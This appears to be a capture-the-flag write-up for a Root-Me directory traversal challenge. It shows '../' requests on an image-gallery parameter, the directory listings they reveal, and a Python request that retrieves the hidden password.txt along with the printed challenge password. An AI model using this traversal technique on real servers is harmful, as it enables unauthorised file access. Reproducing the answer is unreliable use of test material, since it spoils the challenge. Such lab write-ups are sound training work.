@@ -1,0 +1,34 @@
+WebServer Challenge 15 - Directory Traversal
+
+Synopsis: Find the hidden section of the gallery
+
+
+Initially we land on a poorly designed image gallery:
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=actions
+
+Seems galerie is susceptible to a directory traversal by appending ../
+If you request:
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../
+
+You come across one file and one directorie called galerie.  Continuing to dig down in the galerie folder:
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../galerie
+
+We get a listing
+86hwnX2r
+emotes	apps	devices
+categories	actions
+
+Now we request:
+http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=../galerie/86hwnX2r
+
+We notice:
+password.txt
+
+So now by making a direct request to that file we retrieve the password contents:
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt') 
+>>> r.content
+'kcb$!Bx@v4Gs9Ez \n'
+
+
+
